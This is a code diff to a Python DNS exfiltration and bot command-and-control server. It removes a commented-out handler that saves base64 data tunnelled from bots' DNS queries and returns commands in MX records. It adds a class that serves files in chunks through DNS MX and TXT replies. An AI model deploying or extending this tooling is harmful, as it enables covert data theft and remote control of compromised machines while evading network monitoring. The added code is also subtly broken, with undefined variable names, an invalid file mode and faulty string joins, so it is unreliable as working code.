@@ -1,4 +1,5 @@
 import base64
+import os
 
 from dns_exfil import config
 
@@ -76,38 +77,42 @@ class BotExfiltrator(InterceptDefaultResolver):
         encoded_command = base64.standard_b64encode(line.encode('utf-8'))
         return '.'.join([encoded_command.decode('utf-8'), name])
 
-#class BotExfiltrator(InterceptDefaultResolver):
-#    def __init__(self):
-#        super(BotExfiltrator, self).__init__()
-#
-#    def AAAA(self, name):
-#        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
-#
-#    def A(self, name):
-#        rfilename = name.label[1].decode('utf-8')
-#        host = self.client_address[0]
-#        if rfilename == self.context['cmd']:
-#            lfilename = rfilename
-#        else:
-#            lfilename = host + '_' + rfilename
-#        try:
-#            with open(lfilename, 'a+b') as f:
-#                f.write(base64.b64decode(name.label[0]))
-#        except:
-#            pass
-#        return RR(name, QTYPE.A, rdata=A(self.context['ip']), ttl=0)
-#
-#    def MX(self, name):
-#        try:
-#            with open(self.context['cmd']) as f:
-#                 cmd = base64.standard_b64encode(f.readlines()[-1][:-1].encode('utf-8'))
-#        except:
-#            cmd = base64.standard_b64encode(bytes(''))
-#        return RR(name, QTYPE.MX, rdata=MX(cmd.decode('utf-8') + "." + self.context['domain']), ttl=0)
-#
+class ChunkDownloader(InterceptDefaultResolver):
+    def __init__(self):
+        super().__init__()
 
-# Run the actual server. 
+    def MX(self, name):
+        '''
+        This method is used to download files from the server
+        The file is divided into chunks of configurable size,
+        but the chunks must fit in a DNS packet.
+        To keep things simple, the client requests the chunk size
+        and chunk number. TTL should be configured very high to take
+        advantage of cache.
+        The format is c<c#>.s<s#>.<filename>.any.domain.name.com where c# and s# are
+        the chunk number and chunk size, respectively.
+        '''
+        fields = name.split('.')
+        chunk_num = int(field[0][1:])
+        chunk_size = int(field[1][1:])
+        filename = fields[2]
+        with open(filename, 'b') as f:
+            f.seek(chunk_num * chunk_size)
+            data = f.read(chunk_size)
+        encoded_data = base64.standard_b64encode(data)
+        return '.'.join([encoded_data.decode('utf-8')].extend(fields[3:]))
 
+    def TXT(self, name):
+        '''
+        This is the 'index' of the service.
+        It it prints the names and size of the files being served.
+        '''
+        base = self.context['basedir']
+        fileinfo = [(','.join([fn, os.stat(fn).st_size]) for fn in os.listdir(base)]
+        index = '\n'.join(fileinfo)
+        return index
+        
+        
 
 def start_server(resolver):
     server = DNSServer(resolver=resolver, **config['server']['service'])
